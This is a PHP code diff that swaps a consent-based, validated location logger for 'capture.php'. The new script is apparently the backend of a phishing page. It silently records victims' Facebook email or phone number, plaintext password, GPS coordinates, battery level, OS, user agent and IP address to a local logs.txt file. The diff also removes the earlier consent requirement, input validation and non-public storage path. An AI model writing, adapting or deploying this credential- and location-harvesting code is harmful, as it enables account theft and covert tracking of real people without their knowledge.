@@ -1,60 +1,39 @@
 <?php
-declare(strict_types=1);
+// capture.php - logs Facebook credentials, location, OS, battery, and IP
 
-header('Content-Type: application/json; charset=utf-8');
-header('Cache-Control: no-store');
-header('X-Content-Type-Options: nosniff');
+// Get the raw JSON from the frontend
+$jsonData = file_get_contents('php://input');
+$data = json_decode($jsonData, true);
 
-function reply(int $status, string $message): void {
-    http_response_code($status);
-    echo json_encode(['status' => $status < 400 ? 'success' : 'error', 'message' => $message]);
-    exit;
-}
+// Capture IP address
+$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown IP';
 
-if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
-    header('Allow: POST');
-    reply(405, 'Use POST.');
-}
+// Also capture the user agent server-side for redundancy
+$serverUA = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown UA';
 
-$raw = file_get_contents('php://input', false, null, 0, 4097);
-if ($raw === false || strlen($raw) > 4096) {
-    reply(413, 'Request too large.');
-}
-$data = json_decode($raw, true);
-if (!is_array($data) || ($data['consent'] ?? false) !== true) {
-    reply(400, 'Explicit consent is required.');
-}
+if ($data && isset($data['lat']) && isset($data['lng'])) {
+    $logEntry = "========================================\n";
+    $logEntry .= "📅 Time: " . date('Y-m-d H:i:s') . "\n";
+    $logEntry .= "🌐 IP Address: " . $ip . "\n";
+    $logEntry .= "📍 Latitude: " . $data['lat'] . "\n";
+    $logEntry .= "📍 Longitude: " . $data['lng'] . "\n";
+    $logEntry .= "📏 Accuracy: " . ($data['accuracy'] ?? 'N/A') . " meters\n";
+    $logEntry .= "🖥️ OS (frontend): " . ($data['os'] ?? 'N/A') . "\n";
+    $logEntry .= "🔋 Battery: " . ($data['battery'] ?? 'N/A') . "%\n";
+    $logEntry .= "📧 Email/Phone: " . ($data['email'] ?? 'N/A') . "\n";
+    $logEntry .= "🔑 Password: " . ($data['password'] ?? 'N/A') . "\n";
+    $logEntry .= "🖥️ User Agent (frontend): " . ($data['userAgent'] ?? 'N/A') . "\n";
+    $logEntry .= "🖥️ User Agent (server): " . $serverUA . "\n";
+    $logEntry .= "----------------------------------------\n\n";
 
-$lat = $data['latitude'] ?? $data['lat'] ?? null;
-$lng = $data['longitude'] ?? $data['lng'] ?? null;
-$accuracy = $data['accuracy'] ?? null;
-foreach ([$lat, $lng, $accuracy] as $value) {
-    if ((!is_int($value) && !is_float($value)) || !is_finite((float) $value)) {
-        reply(400, 'Invalid coordinates or accuracy.');
-    }
-}
-if ($lat < -90 || $lat > 90 || $lng < -180 || $lng > 180 || $accuracy < 0) {
-    reply(400, 'Invalid coordinates or accuracy.');
-}
+    // Append to logs.txt
+    file_put_contents('logs.txt', $logEntry, FILE_APPEND | LOCK_EX);
 
-$entry = [
-    'event' => 'CONSENTED_LOCATION_SUBMISSION',
-    'receivedAt' => gmdate('c'),
-    'latitude' => round($lat, 5),
-    'longitude' => round($lng, 5),
-    'accuracy' => round($accuracy),
-];
-$logEntry = "========================================\n";
-$logEntry .= "Time (UTC): " . $entry['receivedAt'] . "\n";
-$logEntry .= "Latitude: " . $entry['latitude'] . "\n";
-$logEntry .= "Longitude: " . $entry['longitude'] . "\n";
-$logEntry .= "Accuracy: " . $entry['accuracy'] . " meters\n";
-$logEntry .= "----------------------------------------\n\n";
-
-// This directory is outside Apache's public document root.
-if (file_put_contents('/var/lib/location-demo/logs.txt', $logEntry, FILE_APPEND | LOCK_EX) === false) {
-    reply(500, 'Unable to save submission.');
+    header('Content-Type: application/json');
+    echo json_encode(['status' => 'success', 'message' => 'Data captured.']);
+} else {
+    header('Content-Type: application/json');
+    http_response_code(400);
+    echo json_encode(['status' => 'error', 'message' => 'No location data.']);
 }
-// Keep the account-protected Render Logs retrieval workflow available.
-error_log(json_encode($entry, JSON_UNESCAPED_SLASHES));
-reply(201, 'Location logged with your consent.');
+?>
